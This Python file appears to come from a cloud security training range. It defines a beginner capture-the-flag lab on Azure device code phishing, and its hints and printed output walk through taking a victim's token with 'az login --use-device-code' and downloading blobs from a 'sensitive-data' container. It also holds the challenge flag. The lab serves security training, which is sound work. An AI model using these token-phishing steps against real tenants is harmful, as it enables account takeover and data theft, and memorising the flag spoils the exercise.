from cumulonimbus.providers.base.application_configuration import ApplicationConfigurationAbstract


class ApplicationConfiguration(ApplicationConfigurationAbstract):
    mitre_ttps = [
        {"id": "T1528", "name": "Steal Application Access Token", "url": "https://attack.mitre.org/techniques/T1528/"},
        {"id": "T1566", "name": "Phishing", "url": "https://attack.mitre.org/techniques/T1566/"},
        {"id": "T1530", "name": "Data from Cloud Storage", "url": "https://attack.mitre.org/techniques/T1530/"},
        {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts", "url": "https://attack.mitre.org/techniques/T1078/004/"},
    ]

    def configure_application(self, **kwargs):
        pass

    def get_difficulty(self):
        return "Beginner"

    def get_hints(self):
        return {
            1: "Initiate a device code flow with 'az login --use-device-code --allow-no-subscriptions'. You will get a URL and a one-time code. In a separate browser session, log in as the victim user using that code — this simulates the victim clicking a phishing link.",
            2: "Once the victim authenticates, your CLI session now holds their access token. Run 'az storage account list' to find storage accounts accessible to the victim, then list the blobs: 'az storage blob list --account-name <name> --container-name sensitive-data --auth-mode login'.",
            3: "Download the flag with: az storage blob download --account-name <storage_account> --container-name sensitive-data --name flag.txt --file - --auth-mode login",
        }

    def get_flag(self):
        return "CUMULONIMBUS{D3v1c3_C0d3_Ph1sh1ng_W0rks}"

    def pretty_print_tf_output(self, app_id, output):
        if not output:
            return
        print("###############################################")
        print("#             Required Information            #")
        print("###############################################")
        print("[1] Tenant domain      : " + output["domain_name"]["value"])
        print("[2] Victim username    : " + output["user_name"]["value"])
        print("[3] Victim password    : " + output["user_password"]["value"])
        print("[4] Storage account    : " + output["storage_account_name"]["value"])
        print("[5] Container name     : " + output["container_name"]["value"])
        print("")
        print("Simulate the phishing attack:")
        print("  az login --use-device-code --allow-no-subscriptions")
        print("  # Open the URL shown, enter the code, then log in as the victim user above.")
        print("  az storage blob download \\")
        print("    --account-name {} \\".format(output["storage_account_name"]["value"]))
        print("    --container-name {} \\".format(output["container_name"]["value"]))
        print("    --name flag.txt --file - --auth-mode login")
        self.print_mitre_ttps()
